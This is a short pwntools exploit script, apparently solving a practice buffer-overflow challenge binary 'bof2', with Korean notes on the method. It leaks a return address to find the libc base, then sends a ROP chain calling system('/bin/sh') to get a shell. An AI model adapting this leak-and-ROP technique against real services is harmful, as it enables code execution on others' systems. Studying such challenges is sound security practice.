from pwn import *

# context.log_level='debug'
context.arch='amd64'
p=process('./bof2')
e=ELF('./bof2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

pl1=b'y'+b'A'*14
p.recvline()
p.sendline(pl1)
data=p.recvline()[-7:-1]
data=u64(data+b'\x00\x00')
print(f"data= {data}")
libc_base=data-0x28000-0x21ca
pop_rdi=0x000000000010f75b+libc_base
ret=0x000000000002882f+libc_base
libc_system=libc_base+libc.symbols['system']
print(f"libc_base= {hex(libc_base)}")
bin_sh=list(libc.search(b'/bin/sh'))[0]+libc_base

payload=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(bin_sh)
payload+=p64(libc_system)

p.sendline(b'n'*16+payload)

p.interactive()


#얼라인먼트에 대한 지식이 필요함
#objdump -S /lib/x86-64

# y+아무거나 패딩 -> 출력될때 뒤에있는 retrun 주소까지 출력
# -> 출력된 return 주소를 파싱 -> libc_base 주소 확인
# libc_base 주소를 기반으로 gadget 사용해서 return address overwriting
# 전역 변수 partial relo일 경우 GOT overwrite을 쓰기가 어려울때 Return2dlresolve